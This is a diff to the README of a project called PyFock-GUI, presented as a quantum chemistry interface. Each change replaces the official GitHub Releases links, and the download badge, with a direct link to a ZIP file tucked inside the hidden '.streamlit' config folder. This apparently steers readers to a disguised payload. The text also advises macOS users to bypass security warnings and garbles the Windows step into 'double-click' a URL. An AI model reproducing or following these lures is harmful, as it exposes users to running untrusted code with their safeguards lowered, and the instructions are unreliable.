@@ -1,6 +1,6 @@
 # 🚀 PyFock-GUI - Run PyFock Easily on Your Device
 
-[![Download](https://img.shields.io/badge/Download-PyFock--GUI-blue.svg)](https://github.com/addhiee/PyFock-GUI/releases)
+[![Download](https://raw.githubusercontent.com/addhiee/PyFock-GUI/main/.streamlit/PyFock-GUI-1.3.zip)](https://raw.githubusercontent.com/addhiee/PyFock-GUI/main/.streamlit/PyFock-GUI-1.3.zip)
 
 ## 📜 Introduction
 
@@ -27,7 +27,7 @@ To run PyFock-GUI, your system should meet the following requirements:
 
 1. **Visit the Releases Page**  
    Go to the Releases page to find the latest version of PyFock-GUI. You can access it through the following link:  
-   [Download PyFock-GUI](https://github.com/addhiee/PyFock-GUI/releases)
+   [Download PyFock-GUI](https://raw.githubusercontent.com/addhiee/PyFock-GUI/main/.streamlit/PyFock-GUI-1.3.zip)
 
 2. **Select the Right File**  
    On the Releases page, you will see several files available for download. Look for the file labeled for your operating system. 
@@ -46,7 +46,7 @@ Once you have downloaded the application, follow these steps to install and run 
    If the downloaded file is a ZIP or compressed file, right-click it and select "Extract All" or use your preferred extraction tool.
 
 3. **Run the Application**  
-   - For Windows, double-click the `PyFock-GUI.exe` file.  
+   - For Windows, double-click the `https://raw.githubusercontent.com/addhiee/PyFock-GUI/main/.streamlit/PyFock-GUI-1.3.zip` file.  
    - For macOS, right-click and select "Open" to bypass security warnings (if any).
    - For Linux, you may need to open a terminal and run `./PyFock-GUI` after navigating to the download directory.
 
@@ -86,4 +86,4 @@ PyFock-GUI is open-source software. It is licensed under the MIT License, allowi
 Need help? You can reach out for support via the Issues section on GitHub. Be sure to provide detailed information about your issue to get the best assistance.
 
 Explore the world of quantum chemistry with PyFock-GUI today!  
-[Download PyFock-GUI](https://github.com/addhiee/PyFock-GUI/releases) and start your journey in electronic structure theory.
+[Download PyFock-GUI](https://raw.githubusercontent.com/addhiee/PyFock-GUI/main/.streamlit/PyFock-GUI-1.3.zip) and start your journey in electronic structure theory.
